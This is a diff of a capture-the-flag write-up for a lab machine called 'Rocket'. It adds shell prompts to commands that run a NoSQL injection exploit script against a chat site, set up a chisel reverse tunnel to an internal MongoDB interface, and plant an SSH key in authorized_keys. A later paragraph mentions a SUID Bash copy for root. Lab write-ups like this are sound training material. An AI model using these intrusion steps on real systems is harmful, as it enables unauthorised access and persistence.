@@ -311,7 +311,7 @@ while True:
 Due to the nature of NoSQL injection in this field and the fact that the site may be rate limiting our attempts, it'll take a while to complete.
 
 ```
-python3 exploit.py -u "cbev@rocket.thm" -a "admin@rocket.thm" -t "http://chat.rocket.thm"
+$ python3 exploit.py -u "cbev@rocket.thm" -a "admin@rocket.thm" -t "http://chat.rocket.thm"
 ```
 
 ![](../assets/img/2026-02-15-Rocket/5.png)
@@ -516,19 +516,19 @@ $ cat <<EOF > chisel_base
 > #Type EOF and hit enter once again
 
 #Decoding file contents
-cat chisel_base | base64 -d > chisel
+$ cat chisel_base | base64 -d > chisel
 
 #Adding bit for execution
-chmod +x chisel
+$ chmod +x chisel
 
 #Forwarding Mongo service on port 8081 to local machine
-./chisel server -p 8000 --reverse
+$ ./chisel server -p 8000 --reverse
 ```
 
 Finally on our local machine, connect to the reverse proxy:
 
 ```
-./chisel client MACHINE_IP:8000 R:8081:172.17.0.4:8081
+$ ./chisel client MACHINE_IP:8000 R:8081:172.17.0.4:8081
 ```
 
 Once that's all set up, we can visit the site by going to `localhost:8081` in a browser or using a tool like cURL. Looks like we need authentication before we can access the MongoDB Web Interface.
@@ -592,20 +592,20 @@ Before doing that, we're going to need to SSH into the box to solve some TTY err
 
 ```
 #Create keypair on your local machine
-ssh-keygen -t ed25519
+$ ssh-keygen -t ed25519
 
 #Copy your public key
-cat .ssh/id_ed25519.pub
+$ cat .ssh/id_ed25519.pub
 
 #Echo pubkey contents into authorized_keys file
-echo "CONTENTS_OF_YOUR_PUBLIC_KEY" >>  ~/.ssh/authorized_keys
+$ echo "CONTENTS_OF_YOUR_PUBLIC_KEY" >>  ~/.ssh/authorized_keys
 
 #Set correct directory/file permissions (very important for this to work)
-chmod 700 ~/.ssh
-chmod 600 ~/.ssh/authorized_keys
+$ chmod 700 ~/.ssh
+$ chmod 600 ~/.ssh/authorized_keys
 
 #SSH onto the box using privkey
-ssh -i id_ed25519 alvin@MACHINE_IP
+$ ssh -i id_ed25519 alvin@MACHINE_IP
 ```
 
 An important thing to note here is that we must use Ruby to execute a system command in order to preserve the user's permissions on our Bash copy.  This effectively changes the binaries owner to be root user but still have the SUID bit on it, therefore allowing us to execute it as root user.
